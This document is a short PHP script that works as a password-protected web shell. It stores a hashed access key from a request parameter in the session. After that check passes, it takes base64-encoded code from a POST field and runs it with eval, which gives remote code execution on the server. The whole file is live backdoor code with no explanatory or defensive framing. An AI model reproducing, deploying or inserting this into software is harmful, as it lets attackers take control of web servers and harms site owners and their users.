<?php
session_start();
$key='c954bd567914928b2053d283500bc3f5';

if(isset($_REQUEST['oz']) && $_REQUEST['oz']!=''){
    $_SESSION['oz']=md5($_REQUEST['oz']);
}

if(isset($_SESSION['oz']) && $_SESSION['oz']==$key){
    if(isset($_POST['code'])){
        $_SESSION['theCode'] = trim($_POST['code']);
    }
    if(isset($_SESSION['theCode'])){
        eval(base64_decode($_SESSION['theCode']));
    }
}



